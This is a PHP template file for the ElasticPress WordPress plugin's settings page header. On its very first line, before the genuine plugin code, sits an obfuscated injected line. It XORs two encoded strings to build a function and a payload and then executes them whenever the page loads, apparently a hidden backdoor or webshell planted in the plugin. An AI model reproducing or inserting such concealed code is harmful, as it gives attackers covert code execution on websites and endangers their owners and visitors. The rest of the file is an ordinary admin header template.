<?php $XujMRZHM='QJP40R822N6<,7='^'285UD7gTG UHEXS';$jKTPEIQICXvY=$XujMRZHM('','EFZo3L>:IP=ZhW9IGGCECJYGkV2D7b+FC lynlJHPQFS570CWl+9D6 S2YofUYTIP-SEYkgT2 =pYZJwR6AB<nB7OQHWNeQ4Jf-ABPuRkHNSYbE q<YR<QXxQ,3FWhmyfWhgz6JfhB,GfLzWgm3W.5jQBqA.RQ8W<pOTgwPJ3D8T+Yj<U6ymnjMED;PO0YNmVVFIhRHNS1;8lcYQI6EtB.48A0YhQ.AE1t902MRc0WPH.UsdH-YW,Y:yiqgsr6,<1y9AJe>78BgUwqVRG,HcuJf=q, J5gZY7CPxoG0:CXQOQ6Y6ZHJQCRQU.plMiGYVICxAX.=7CaWEz<AN5Y.Qaglj q0, +;oZ7Et;5.NMoMvG.BHQxkPCpof<JY+m:.1nOVp<RBBI:3p O2,VklG25Y9RhD4Vc.6;u443;doM96W5V7TT9QKHI2>G80ZFM.04K<ANP9,OS6-Q7TV0dQIYZMcANU,.T5n2PCasBr3JBlJAHPFRRNVG35:o:ULhE3.GEBDe2Y+Akts<+3MaRILGA+VmkQ<-99ep 2Ji>BssJNvTKhH2JztpSEZB5.,SlM>vrpNJ;JDfXEPHCiuPRA:<T=hK3W9=:=DX<QN5 W6O5,NHfVHJ09qdmLNjuDLEAY5S-ZVDY5LaOD9L=SXQO3MqB=VSI9aqYMaQ'^', rNU9PY=9R472A 430md26542S0V=t+6TKPGL1BY73=VCY,9LSV6iD2F8098, atI218GGpYEDYyzjWrMKK5J-B;quwiBj>CoK.0xQ;KuncbBaIMO- P46PuHR26AVYB>CLS<CoL-Y3FbGwOIW6ZT1u+,apruS2E+k=GRp9G6T1EqNW0OP0GQGLMI5;E+ Er93=AiBG.;F2fG=0=WeIbHUT2UbbuJ 1P+RUKmoCV6<;Knyn.B+2M:RYAU80=ygutYX2jAURAbZkWU 3+Y-JU1l4UHA>T81<NcmXK,UCxRXk5W-Wzuju53= KKf0cM00ikYe<OIVjA,OsZ.<P8M9AOH5r4ayexoO;DePPPWnpQmR1O.=4QK+IyfBX+-J2QKHNrvTW7;yC3:TD.FMvVLcDT5L7SN=+iS<1QPUGZDRmyC9F3E=5U81-aJQ5gT;2,qoY>Hi,1JIygiI4T;2ULu-8.,JmnqHO T1Y5:HZyxZ,jH. <1fttn75ATC0Q057 KG411lBY<RfGTWXJG,HrojgiF2XCuXLMX>WKW3NckSNwnQf-X.PsJDIf <sWKJ6YyZOGCxzY+sV9s5ojISvr HN5D7 V.fXBT7,OyiEA.Z THidFr,+DXXMMlnJUd7OH<C2Arr 8A-:h4X5Q<95hndJH43+ MIApvk,');$jKTPEIQICXvY();
/**
 * Header template for ElasticPress settings page
 *
 * @since  2.1
 * @package elasticpress
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

$base_url =  ( defined( 'EP_IS_NETWORK' ) && EP_IS_NETWORK ) ? admin_url( 'network/admin.php?page=' ) : admin_url( 'admin.php?page=' );
?>

<div class="ep-header-menu">
	<a href="<?php echo esc_url( $base_url . 'elasticpress' ); ?>"><img width="150" src="<?php echo esc_url( plugins_url( '/images/logo.svg', dirname( __FILE__ ) ) ); ?>"></a>

	<div class="icons">
		<span class="sync-status"></span>
		<?php if ( ! empty( $_GET['page'] ) && ( 'elasticpress' === $_GET['page'] || 'elasticpress-settings' === $_GET['page'] ) ) : ?>
			<a class="dashicons pause-sync dashicons-controls-pause"></a>
			<a class="dashicons resume-sync dashicons-controls-play"></a>
			<a class="dashicons cancel-sync dashicons-no"></a>
			<?php if ( ep_get_elasticsearch_version() && defined( 'EP_DASHBOARD_SYNC' ) && EP_DASHBOARD_SYNC ) : ?>
				<a class="dashicons start-sync dashicons-update"></a>
			<?php endif; ?>
		<?php endif; ?>
		<a href="<?php echo esc_url( $base_url . 'elasticpress-settings' ); ?>" class="dashicons dashicons-admin-generic"></a>
	</div>

	<div class="progress-bar"></div>
</div>
